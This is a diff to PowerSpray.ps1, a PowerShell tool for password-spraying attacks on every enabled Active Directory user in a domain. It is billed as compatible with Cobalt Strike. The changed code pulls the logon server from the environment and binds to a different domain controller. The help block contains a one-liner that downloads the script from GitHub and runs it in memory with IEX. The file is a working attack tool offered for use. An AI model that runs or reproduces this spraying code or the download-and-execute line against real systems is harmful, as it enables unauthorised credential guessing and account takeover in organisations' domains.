@@ -1,53 +1,37 @@
-Function PowerSpray {
+ Function PowerSpray {
     <#
-
     .SYNOPSIS
-
         PowerSpray.ps1 Function: PowerSpray
         Author: John Cartrett (@jnqpblc)
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: None
-
     .DESCRIPTION
-
         This module is a simple script to perform a password spraying attack against all users of a domain and is compatible with Cobaltstrike.
         By default it will automatically generate the UserList from the domain.
         By default it will automatically generate the PasswordList using the current date.
         Be careful not to lockout any accounts.
 	
 	PS C:\> IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/jnqpblc/Misc-PowerShell/master/PowerSpray.ps1"); PowerSpray
-
     .LINK
-
         https://github.com/tallmega/PowerSpray
         https://serverfault.com/questions/276098/check-if-user-password-input-is-valid-in-powershell-script
         https://social.technet.microsoft.com/wiki/contents/articles/4231.working-with-active-directory-using-powershell-adsi-adapter.aspx
         https://blog.fox-it.com/2017/11/28/further-abusing-the-badpwdcount-attribute/
-
     .PARAMETER Passwords
-
         A comma-separated list of passwords to use instead of the internal list generator.
 	
     .PARAMETER Seeds
-
         A comma-separated list of passwords to as a seed to the internal list generator.
-
     .PARAMETER Delay
-
         The delay time between guesses in millisecounds.
-
     .PARAMETER Sleep
-
         The number of minutes to sleep between password cycles.
-
     .EXAMPLE
-
         PowerSpray
         PowerSpray -Delay 1000 -Sleep 10
         PowerSpray -Seeds Password,Welcome,Cougars,Football
         PowerSpray -Passwords "Password1,Password2,Password1!,Password2!"
-
     #> 
     param (
     	[parameter(Mandatory=$false, HelpMessage="A comma-separated list of passwords to use instead of the internal list generator.")]
@@ -59,9 +43,16 @@ Function PowerSpray {
     	[parameter(Mandatory=$false, HelpMessage="The number of minutes to sleep between password cycles.")]
     	[int]$Sleep
     )
+    
+    $LogonServer = (Get-Item Env:LOGONSERVER).Value.TrimStart('\\')
+    if ([string]::IsNullOrEmpty($LogonServer))
+    {
+        Write-Output "[-] Failed to retrieve the LOGONSERVER the environment variable; the script will exit."
+        Break
+    }
 
-     Try {
-        $objPDC = [ADSI] "LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PDCRoleOwner)";
+    Try {
+        $objPDC = [ADSI] "LDAP://$([System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().InterSiteTopologyGenerator.Name)";
         $Searcher = New-Object DirectoryServices.DirectorySearcher;
         $Searcher.Filter = '(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';
         $Searcher.PageSize = 1000;
@@ -112,7 +103,7 @@ Function PowerSpray {
         Write-Output "[*] Using password $Password"
         foreach ($UserName in $UserList)
         {
-            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName;
+            $CurrentDomain = "LDAP://" + $LogonServer;
             if (([string]::IsNullOrEmpty($CurrentDomain)))
             {
                 Write-Output "[-] Failed to retrieve the domain name; the script will exit."
@@ -184,4 +175,4 @@ Function Generate-Passwords($SeedList) {
         }
         return $PasswordList
     }
-} 
+}  
